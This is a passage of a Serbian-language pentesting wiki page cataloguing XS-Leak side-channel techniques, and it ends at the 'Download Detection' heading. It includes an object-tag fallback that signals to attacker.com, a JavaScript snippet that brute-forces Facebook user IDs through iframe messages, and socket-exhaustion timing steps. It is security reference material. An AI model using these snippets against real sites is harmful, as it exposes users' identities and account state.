# XS-Search/XS-Leaks

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

XS-Search je metoda koja se koristi za **ekstrahovanje cross-origin informacija** iskorišćavanjem **side channel ranjivosti**.

Ključne komponente uključene u ovaj napad su:

- **Vulnerable Web**: ciljni sajt sa kog se želi izvući informacija.
- **Attacker's Web**: zlonamerni sajt koji napadač postavi i koji žrtva posećuje, a koji sadrži exploit.
- **Inclusion Method**: tehnika upotrebljena za uključivanje Vulnerable Web u Attacker's Web (npr. window.open, iframe, fetch, HTML tag sa href, itd.).
- **Leak Technique**: tehnike korišćene da se razluče razlike u stanju Vulnerable Web na osnovu informacija prikupljenih putem inclusion method.
- **States**: dva moguća stanja Vulnerable Web koja napadač pokušava da razlikuje.
- **Detectable Differences**: uočljive varijacije na koje se napadač oslanja da bi zaključio stanje Vulnerable Web.

### Detectable Differences

Nekoliko aspekata može se analizirati da bi se razlikovala stanja Vulnerable Web:

- **Status Code**: razlikovanje između **različitih HTTP response status code** cross-origin, kao što su server errors, client errors ili authentication errors.
- **API Usage**: identifikacija **korišćenja Web APIs** na stranicama, otkrivajući da li cross-origin stranica koristi određeni JavaScript Web API.
- **Redirects**: detekcija navigacija ka različitim stranicama, ne samo HTTP redirects već i onih pokrenutih JavaScript-om ili HTML-om.
- **Page Content**: posmatranje **varijacija u HTTP response body** ili u pod-resursima stranice, kao što su **broj ugrađenih frame-ova** ili razlike u veličini slika.
- **HTTP Header**: uočavanje prisustva ili moguće vrednosti **specifičnog HTTP response header-a**, uključujući header-e kao što su X-Frame-Options, Content-Disposition i Cross-Origin-Resource-Policy.
- **Timing**: uočavanje konzistentnih vremenskih razlika između dva stanja.

### Inclusion Methods

- **HTML Elements**: HTML nudi razne elemente za **cross-origin resource inclusion**, kao što su stylesheets, images ili scripts, koji primoravaju browser da zahteva non-HTML resurs. Kompilacija potencijalnih HTML elemenata za ovu svrhu može se naći na [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
- **Frames**: elementi poput **iframe**, **object**, i **embed** mogu direktno ugraditi HTML resurse u napadačevu stranicu. Ako stranica **nema framing protection**, JavaScript može pristupiti window objektu u okviru frame-a preko contentWindow property.
- **Pop-ups**: metoda **`window.open`** otvara resurs u novom tabu ili prozoru, obezbeđujući **window handle** za JavaScript kako bi interagovao sa metodama i svojstvima u skladu sa SOP. Pop-up-ovi, često korišćeni u single sign-on, zaobilaze framing i cookie restrikcije ciljnih resursa. Međutim, moderni browser-i ograničavaju kreiranje pop-up-ova na određene korisničke akcije.
- **JavaScript Requests**: JavaScript dozvoljava direktne zahteve ka ciljanim resursima korišćenjem **XMLHttpRequests** ili **Fetch API**. Ove metode pružaju preciznu kontrolu nad zahtevom, kao što je opcija da se prate HTTP redirects.

### Leak Techniques

- **Event Handler**: klasična leak tehnika u XS-Leaks, gde event handler-i poput **onload** i **onerror** daju informacije o uspehu ili neuspehu učitavanja resursa.
- **Error Messages**: JavaScript izuzeci ili specijalne error strane mogu pružiti leak informaciju bilo direktno iz error poruke ili razlikovanjem između njenog prisustva i odsustva.
- **Global Limits**: fizička ograničenja browser-a, kao što su memorijski kapacitet ili druga nametnuta ograničenja, mogu signalizirati kada je dostignut prag i služiti kao leak tehnika.
- **Global State**: detektabilne interakcije sa globalnim stanjima browser-a (npr. History interfejs) mogu se iskoristiti. Na primer, **broj unosa** u istoriji browser-a može dati naznake o cross-origin stranicama.
- **Performance API**: ovaj API pruža **detalje o performansama trenutne stranice**, uključujući network timing za dokument i učitane resurse, omogućavajući izvođenje zaključaka o zahtevima resursa.
- **Readable Attributes**: neki HTML atributi su **čitljivi cross-origin** i mogu se koristiti kao leak tehnika. Na primer, `window.frame.length` property omogućava JavaScript-u da prebroji frame-ove uključene u web stranicu cross-origin.

## XSinator Tool & Paper

XSinator je automatski alat za **proveru browser-a protiv više poznatih XS-Leaks** objašnjenih u njegovom paper-u: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Možete **pristupiti alatu na** [**https://xsinator.com/**](https://xsinator.com/)

> [!WARNING]
> **Excluded XS-Leaks**: Morali smo da isključimo XS-Leaks koji zavise od **service workers** jer bi oni ometali druge leaks u XSinator-u. Dodatno, odlučili smo da **isključimo XS-Leaks koji se oslanjaju na misconfigurations i bagove u specifičnoj web aplikaciji**. Na primer, CrossOrigin Resource Sharing (CORS) misconfigurations, postMessage leakage ili Cross-Site Scripting. Takođe, isključili smo timebased XS-Leaks jer su često spori, noisy i netačni.

## **Timing Based techniques**

Neke od sledećih tehnika će koristiti timing kao deo procesa za detekciju razlika u mogućim stanjima web stranica. Postoje različiti načini za merenje vremena u web browser-u.

**Clocks**: [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API omogućava developerima da dobiju high-resolution vremenska merenja.\
Postoji značajan broj API-ja koje napadači mogu zloupotrebiti da kreiraju implicitne satove: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animations i drugi.\
Za više informacija: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Event Handler Techniques

### Onload/Onerror

- **Inclusion Methods**: Frames, HTML Elements
- **Detectable Difference**: Status Code
- **More info**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
- **Summary**: ako se pokuša učitati resurs, onerror/onload eventi se aktiviraju kada je resurs neuspešno/uspešno učitan — na taj način je moguće zaključiti status kod.
- **Code example**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](<https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)>)


{{#ref}}
cookie-bomb-+-onerror-xs-leak.md
{{#endref}}

Primer koda pokušava da **učita scripts objects iz JS**, ali **drugi tagovi** kao što su objects, stylesheets, images, audios takođe mogu biti korišćeni. Štaviše, moguće je i ubaciti **tag direktno** i deklarisati `onload` i `onerror` event-e unutar taga (umesto da se injektuju iz JS-a).

Postoji i verzija ovog napada bez skripti:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
U ovom slučaju, ako `example.com/404` nije pronađen, biće učitan `attacker.com/?error`.

### Content-Type/CORB script load oracle

- **Inclusion Methods**: HTML Elements (script)
- **Detectable Difference**: Zaglavlje / Content-Type putem onload vs onerror (CORB)
- **Summary:** Ako endpoint vraća HTML na poklapanje, a JSON na ne-poklapanje, učitajte ga pomoću `<script src>`. HTML pokreće `onload`; JSON je CORB-blokiran i pokreće `onerror`, dajući Boolean oracle za brute-force identifikatora kao što je `__user` unutar poznatog opsega.
- **Notes:** Radi cross-origin bez čitanja body-ja; pogodno za enumerisanje aktivnog naloga kada je jedan tenant ID fiksiran.

### postMessage vs X-Frame-Options deny oracle

- **Inclusion Methods**: Frames
- **Detectable Difference**: Zaglavlje (XFO) + postMessage prisustvo/odsustvo
- **Summary:** Neki widgets šalju postMessage roditelju nakon učitavanja. Ako je zahtev framed sa pogrešnim identifikatorom, server može odgovoriti sa `X-Frame-Options: deny`, sprečavajući renderovanje i time se poruka ne emituje. Postavljanjem iframe `src` sa kandidatskim ID-jem, čekanjem na `message` događaj (uspeh) i tretiranjem timeout/no message kao neuspeh, aktivni nalog se može brute-force-ovati.
- **Minimal snippet:**
```html
<iframe id=fb width=0 height=0></iframe>
<script>
function test(id){
fb.src=`https://www.facebook.com/plugins/like.php?__a=1&__user=${id}`;
return new Promise(r=>{
const t=setTimeout(()=>r(false),2000);
onmessage=()=>{clearTimeout(t);r(true);}
});
}
</script>
```
- **Povezano:**
{{#ref}}
../postmessage-vulnerabilities/README.md
{{#endref}}

{{#ref}}
../iframe-traps.md
{{#endref}}

za više message/iframe zamki.

### Onload Timing

- **Metode uključivanja**: HTML Elements
- **Detektabilna razlika**: Timing (generalno zbog Page Content, Status Code)
- **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
- **Sažetak:** The [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** može da se koristi za merenje koliko vremena je potrebno za izvršenje zahteva. Međutim, mogu se koristiti i drugi clocks, kao što je [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) koji može identifikovati zadatke koji traju duže od 50ms.
- **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) drugi primer u:


{{#ref}}
performance.now-example.md
{{#endref}}

#### Onload Timing + Forced Heavy Task

Ova tehnika je ista kao prethodna, ali attacker će takođe prisiliti neku akciju da traje značajno vreme kada je odgovor pozitivan ili negativan i izmeriti to vreme.


{{#ref}}
performance.now-+-force-heavy-task.md
{{#endref}}

### unload/beforeunload Timing

- **Metode uključivanja**: Frames
- **Detektabilna razlika**: Timing (generalno zbog Page Content, Status Code)
- **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
- **Sažetak:** The [SharedArrayBuffer clock](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) može se koristiti za merenje koliko vremena je potrebno za izvršenje zahteva. Mogu se koristiti i drugi clocks.
- **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Vreme potrebno za preuzimanje resursa može se izmeriti korišćenjem `unload` i `beforeunload` događaja. Događaj `beforeunload` se okida kada pregledač sprema da navigira na novu stranicu, dok se `unload` događa kada navigacija zapravo traje. Razlika u vremenu između ova dva događaja može se izračunati da bi se odredilo trajanje koliko je pregledač proveo preuzimajući resurs.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

- **Metode uključivanja**: Frames
- **Detektabilna razlika**: Timing (generalno zbog Page Content, Status Code)
- **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
- **Sažetak:** The [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API može da se koristi za merenje koliko vremena je potrebno za izvršenje zahteva. Mogu se koristiti i drugi clocks.
- **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Primećeno je da, u odsustvu [Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/), vreme potrebno da se stranica i njeni subresursi učitaju preko mreže može izmeriti attacker. Ovo merenje je obično moguće zato što se onload handler iframe-a okida tek nakon završetka učitavanja resursa i izvršenja JavaScript-a. Da bi se zaobišla varijabilnost uvedena izvršavanjem skripti, attacker može upotrebiti sandbox atribut unutar <iframe>. Uključivanje ovog atributa ograničava brojne funkcionalnosti, naročito izvršenje JavaScript-a, čime se olakšava merenje koje je pretežno pod uticajem performansi mreže.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

- **Metode uključivanja**: Frames
- **Uočljiva razlika**: Page Content
- **Više informacija**:
- **Sažetak**: Ako možete navesti stranicu da izbaci grešku kada se pristupi ispravnom sadržaju, a da se pravilno učita kada se pristupi bilo kojem drugom sadržaju, možete napraviti petlju koja će izvući sve informacije bez merenja vremena.
- **Primer koda**:

Pretpostavimo da možete **insert** stranicu koja ima **tajni** sadržaj **inside an Iframe**.

Možete naterati žrtvu da pretraži fajl koji sadrži "_**flag**_" koristeći Iframe (npr. iskorišćavanjem CSRF-a). Unutar Iframe-a znate da će se _**onload event**_ **uvek izvršiti bar jednom**. Zatim možete promeniti **URL** iframe-a menjajući samo sadržaj **hash** dela URL-a.

Na primer:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Ako je prva URL uspešno učitana, onda pri promeni hash dela URL-a **onload event** se neće ponovo pokrenuti. Ali **ako** je stranica imala neku grešku pri učitavanju, tada će se **onload event** ponovo okinuti.

Na taj način možete razlikovati između stranice koja je ispravno učitana i stranice koja pri pristupu daje grešku.

### Javascript Execution

- **Metode uključivanja**: Frames
- **Uočljiva razlika**: Page Content
- **Više informacija**:
- **Sažetak:** Ako stranica vraća osetljiv sadržaj, ili sadržaj koji može biti kontrolisan od strane korisnika, korisnik bi mogao postaviti validan JS kod u negativnom slučaju i učitavati ga pri svakom pokušaju unutar `<script>` tagova; tako se u negativnim slučajevima izvršava napadačev kod, a u afirmativnim slučajevima se ništa neće izvršiti.
- **Primer koda:**


{{#ref}}
javascript-execution-xs-leak.md
{{#endref}}

### CORB - Onerror

- **Metode uključivanja**: HTML Elements
- **Uočljiva razlika**: Status Code & Headers
- **Više informacija**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
- **Sažetak**: **Cross-Origin Read Blocking (CORB)** je mera bezbednosti koja sprečava web stranice da učitaju određene osetljive cross-origin resurse radi zaštite od napada poput **Spectre**. Međutim, napadači mogu iskoristiti ponašanje ove zaštite. Kada odgovor podložan **CORB**-u vraća _**CORB protected**_ `Content-Type` sa `nosniff` i `2xx` status kodom, **CORB** uklanja telo i headers odgovora. Napadači koji to posmatraju mogu zaključiti kombinaciju **status koda** (koji ukazuje na uspeh ili grešku) i `Content-Type` (koji označava da li je zaštićen od strane **CORB**), što može dovesti do potencijalnog leak-a informacija.
- **Primer koda:**

Pogledajte link u "Više informacija" za dodatne detalje o napadu.

### onblur

- **Metode uključivanja**: Frames
- **Uočljiva razlika**: Page Content
- **Više informacija**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
- **Sažetak**: Leak osetljive podatke iz id ili name atributa.
- **Primer koda**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Moguće je učitati stranicu unutar iframe-a i koristiti `#id_value` da bi se stranica fokusirala na element iframe-a sa datim id-om; ako se okine `onblur` signal, element sa tim ID-om postoji.\
Isti napad se može izvesti i pomoću `portal` tagova.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

- **Metode uključivanja**: Frames, Pop-ups
- **Uočljiva razlika**: API Usage
- **Više informacija**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
- **Sažetak**: Skupljanje osetljivih informacija iz postMessage ili korišćenje prisustva postMessages kao orakla za saznanje statusa korisnika na stranici
- **Primer koda**: `Any code listening for all postMessages.`

Aplikacije često koriste [`postMessage` broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) za komunikaciju između različitih origin-a. Međutim, ova metoda može nenamerno izložiti **osetljive informacije** ako parametar `targetOrigin` nije pravilno specificiran, omogućavajući bilo kojem window-u da primi poruke. Nadalje, sam čin primanja poruke može delovati kao **oracle**; na primer, određene poruke mogu se slati samo korisnicima koji su prijavljeni. Dakle, prisustvo ili odsustvo ovih poruka može otkriti informacije o stanju ili identitetu korisnika, kao što je da li je autentifikovan ili ne.

## Global Limits Techniques

### WebSocket API

- **Metode uključivanja**: Frames, Pop-ups
- **Uočljiva razlika**: API Usage
- **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Sažetak**: Exhausting the WebSocket connection limit leaks the number of WebSocket connections of a cross-origin page.
- **Primer koda**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)>), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)>)

Moguće je identifikovati da li i koliko **WebSocket** konekcija ciljna stranica koristi. To omogućava napadaču da detektuje stanja aplikacije i leak-uje informacije vezane za broj WebSocket konekcija.

Ako jedan **origin** koristi maksimalan broj WebSocket objekata, nezavisno od stanja konekcija, kreiranje novih objekata će rezultovati JavaScript izuzecima. Da bi se izveo ovaj napad, napadačev sajt otvori ciljnu stranicu u pop-up-u ili iframe-u i, nakon što se ciljna stranica učita, pokuša da kreira maksimalan broj WebSocket konekcija. **Broj bačenih izuzetaka** odgovara **broju WebSocket konekcija** koje koristi prozor ciljne stranice.

### Payment API

- **Metode uključivanja**: Frames, Pop-ups
- **Uočljiva razlika**: API Usage
- **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Sažetak**: Detect Payment Request because only one can be active at a time.
- **Primer koda**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Ovaj XS-Leak omogućava napadaču da detektuje kada cross-origin stranica inicira payment request.

Pošto može biti aktivan samo jedan Payment Request u isto vreme, ako ciljna stranica koristi Payment Request API, bilo koji dalji pokušaji da se prikaže ovaj API će neuspeti i prouzrokovati JavaScript izuzetak. Napadač može iskoristiti ovo tako što periodično pokušava da prikaže Payment API UI. Ako neki pokušaj izazove izuzetak, ciljna stranica trenutno koristi Payment Request. Napadač može sakriti ove periodične pokušaje tako što odmah zatvori UI nakon njegovog pojavljivanja.

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

- **Metode uključivanja**:
- **Uočljiva razlika**: Timing (obično zbog Page Content, Status Code)
- **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
- **Sažetak:** Merite vreme izvršenja web koda zloupotrebljavajući jednonitni (single-threaded) JS event loop.
- **Primer koda**:


{{#ref}}
event-loop-blocking-+-lazy-images.md
{{#endref}}

JavaScript radi po modelu konkurentnosti zasnovanom na [single-threaded event loop](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop), što znači da **može izvršavati samo jednu zadatak u datom trenutku**. Ova karakteristika može se iskoristiti da se oceni **koliko dugo kod iz druge origin-e zahteva za izvršenje**. Napadač može meriti vreme izvršenja svog koda u event loop-u kontinuiranim dispečovanjem događaja sa fiksnim svojstvima. Ti događaji će biti obrađeni kada bude prazna lista događaja. Ako i druge origin-e takođe dispečuju događaje u isti pool, **napadač može zaključiti vreme potrebno za izvršenje tih eksternih događaja posmatrajući kašnjenja u izvršenju sopstvenih zadataka**. Ovaj metod nadgledanja event loop-a može otkriti vreme izvršenja koda iz drugih origin-a, potencijalno otkrivajući osetljive informacije.

> [!WARNING]
> U execution timing napadima moguće je **eliminišati** **mrežne faktore** da bi se dobila **preciznija merenja**. Na primer, učitavanjem resursa koje stranica koristi pre njenog učitavanja.

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

- **Metode uključivanja**:
- **Uočljiva razlika**: Timing (obično zbog Page Content, Status Code)
- **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
- **Sažetak:** Jedna metoda za merenje vremena izvršenja web operacije uključuje namerno blokiranje event loop-a nit i zatim merenje **koliko vremena je potrebno da se event loop ponovo oslobodi**. Ubacivanjem blokirajuće operacije (npr. dugog proračuna ili sinhronog API poziva) u event loop i praćenjem vremena koje je potrebno da se sledeći kod počne izvršavati, može se zaključiti trajanje zadataka koji su se izvršavali u event loop-u tokom blokiranja. Ova tehnika koristi jednonitnu prirodu JavaScript event loop-a, gde se zadaci izvršavaju sekvencijalno, i može dati uvid u performanse ili ponašanje drugih operacija koje dele istu nit.
- **Primer koda**:

Jedna značajna prednost tehnike merenja vremena zaključavanjem event loop-a je njena sposobnost da zaobiđe **Site Isolation**. **Site Isolation** je bezbednosna funkcija koja deli različite sajtove u odvojene procese kako bi sprečila zlonamerne sajtove da direktno pristupe osetljivim podacima drugih sajtova. Međutim, uticanjem na vreme izvršenja druge origin-e kroz deljeni event loop, napadač može indirektno izvući informacije o aktivnostima te origin-e. Ova metoda se ne oslanja na direktan pristup podacima druge origin-e, već posmatra uticaj aktivnosti te origin-e na deljeni event loop, čime zaobilazi zaštitne barijere koje postavlja **Site Isolation**.

> [!WARNING]
> U execution timing napadima moguće je **eliminišati** **mrežne faktore** da bi se dobila **preciznija merenja**. Na primer, učitavanjem resursa koje stranica koristi pre njenog učitavanja.

### Connection Pool

- **Metode uključivanja**: JavaScript Requests
- **Uočljiva razlika**: Timing (obično zbog Page Content, Status Code)
- **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
- **Sažetak:** Napadač može zablokirati sve sokete osim jednog, učitati ciljnu stranicu i istovremeno učitati drugu stranicu; vreme dok poslednja stranica ne počne da se učitava odgovara vremenu koje je ciljna stranica zahtevala za učitavanje.
- **Primer koda**:


{{#ref}}
connection-pool-example.md
{{#endref}}

Browser-i koriste sokete za komunikaciju sa serverima, ali zbog ograničenih resursa operativnog sistema i hardvera, **browser-i su primorani da uvedu limit** na broj istovremenih soketa. Napadači mogu iskoristiti ovo ograničenje sledećim koracima:

1. Utvrditi limit soketa u browser-u, na primer 256 globalnih soketa.
2. Zauzeti 255 soketa na duži period pokretanjem 255 zahteva ka različitim host-ovima, dizajniranih da drže konekcije otvorenim bez završetka.
3. Upotrebiti 256. soket da pošalje zahtev ka ciljnoj stranici.
4. Pokušati 257. zahtev ka drugačijem host-u. Pošto su svi soketi u upotrebi (prema koracima 2 i 3), ovaj zahtev će biti u redu dok se ne oslobodi neki soket. Kašnjenje pre nego što ovaj zahtev nastavi daje napadaču vremensku informaciju o mrežnoj aktivnosti vezanoj za 256. soket (soket ciljane stranice). Ovo zaključivanje je moguće jer su 255 soketa iz koraka 2 i dalje zauzeti, što znači da mora biti oslobođen soket iz koraka 3. Vreme potrebno da se 256. soket oslobodi direktno je povezano sa vremenom potrebnim da zahtev ka ciljnoj stranici bude završen.

Za više informacija: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Connection Pool by Destination

- **Metode uključivanja**: JavaScript Requests
- **Uočljiva razlika**: Timing (obično zbog Page Content, Status Code)
- **Više informacija**:
- **Sažetak:** Slično prethodnoj tehnici, ali umesto da se koriste svi soketi, Google **Chrome** postavlja limit od **6 istovremenih zahteva prema istom origin-u**. Ako zablokiramo 5 i zatim pokrenemo 6. zahtev možemo izmeriti njegovo trajanje; ako uspemo da nateramo ciljnu stranicu da pošalje više zahteva ka istom endpoint-u da detektujemo status stranice, **6. zahtev** će trajati duže i to se može detektovati.

## Performance API Techniques

[`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) pruža informacije o performansama web aplikacija, dopunjene od strane [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API). Resource Timing API omogućava praćenje detaljnih mrežnih vremenskih podataka za zahteve, kao što je trajanje zahteva. Kada serveri uključe `Timing-Allow-Origin: *` header u odgovore, dodatni podaci kao što su transfer size i vreme DNS lookup-a postaju dostupni.

Ove informacije se mogu dobiti putem metoda kao što su [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) ili [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), pružajući sveobuhvatan prikaz podataka povezanih sa performansama. Takođe, API omogućava merenje vremena izvršenja računajući razliku između timestamp-a dobijenih iz [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). Međutim, vredi napomenuti da za određene operacije u browser-ima kao što je Chrome, preciznost `performance.now()` može biti ograničena na milisekunde, što utiče na granularnost timing merenja.

Pored merenja vremena, Performance API se može iskoristiti za bezbednosne uvide. Na primer, prisustvo ili odsustvo stranica u `performance` objektu u Chrome-u može ukazati na primenu `X-Frame-Options`. Konkretno, ako je stranica blokirana od renderovanja u frame-u zbog `X-Frame-Options`, ona neće biti zabeležena u `performance` objektu, što daje suptilan trag o politici framovanja stranice.

### Error Leak

- **Metode uključivanja**: Frames, HTML Elements
- **Uočljiva razlika**: Status Code
- **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Sažetak:** Zahtevi koji rezultuju greškom neće kreirati resource timing entry.
- **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Moguće je razlikovati HTTP response status kodove zato što zahtevi koji vode do greške ne kreiraju performance entry.

### Style Reload Error

- **Metode uključivanja**: HTML Elements
- **Uočljiva razlika**: Status Code
- **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Sažetak:** Zbog buga u browser-u, resursi koji se ne uspeju učitati mogu biti učitani dva puta.
- **Primer koda**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

U prethodnoj tehnici identifikovana su dva slučaja gde browser bug-ovi u GC dovode do **duplog učitavanja resursa kada ne uspeju da se učitaju**. Ovo će rezultovati višestrukim unosima u Performance API i može se otkriti.

### Request Merging Error

- **Metode uključivanja**: HTML Elements
- **Uočljiva razlika**: Status Code
- **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Sažetak:** Zahtevi koji rezultuju greškom ne mogu biti merged-ovani.
- **Primer koda**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Tehnika je nabrojana u tabeli u pomenutom radu, ali nema dodatnog opisa. Međutim, možete pronaći izvorni kod koji proverava ovo u [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Empty Page Leak

- **Metode uključivanja**: Frames
- **Uočljiva razlika**: Page Content
- **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Sažetak:** Empty responses ne kreiraju resource timing entry.
- **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Napadač može detektovati da li je zahtev rezultovao praznim HTTP response body-jem zato što **empty pages ne kreiraju performance entry u nekim browser-ima**.

### **XSS-Auditor Leak**

- **Metode uključivanja**: Frames
- **Uočljiva razlika**: Page Content
- **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Sažetak:** Korišćenjem XSS Auditor-a u Security Assertions, napadači mogu detektovati specifične elemente web stranica posmatrajući promene u odgovorima kada crafted payload-i aktiviraju mehanizam filtera audita.
- **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

U Security Assertions (SA), XSS Auditor, koji je prvobitno dizajniran da spreči Cross-Site Scripting (XSS) napade, može paradoksalno biti iskorišćen za leak-ovanje osetljivih informacija. Iako je ova ugrađena funkcija uklonjena iz Google Chrome-a (GC), i dalje je prisutna u SA. Godine 2013. Braun i Heiderich su pokazali da XSS Auditor može nenamerno blokirati legitimne skripte, dovodeći do false positives. Na toj osnovi, istraživači su razvili tehnike za izvlačenje informacija i detekciju specifičnog sadržaja na cross-origin stranicama, koncept poznat kao XS-Leaks, inicijalno prijavljen od strane Terada i razrađen od strane Heyes-a u blog postu. Iako su ove tehnike bile specifične za XSS Auditor u GC, otkriveno je da u SA stranice blokirane od strane XSS Auditor-a ne generišu unose u Performance API, otkrivajući metod kroz koji osetljive informacije i dalje mogu biti leak-ovane.

### X-Frame Leak

- **Metode uključivanja**: Frames
- **Uočljiva razlika**: Header
- **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
- **Sažetak:** Resurs sa X-Frame-Options header-om ne kreira resource timing entry.
- **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Ako stranica **nije dozvoljena** da se renderuje u **iframe** ona neće kreirati performance entry. Kao rezultat, napadač može detektovati odgovor header **`X-Frame-Options`**.\
Isto važi i ako koristite **embed** tag.

### Download Detection

- **Metode uključivanja**: Frames
- **Uočljiva razlika**: Header
- **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
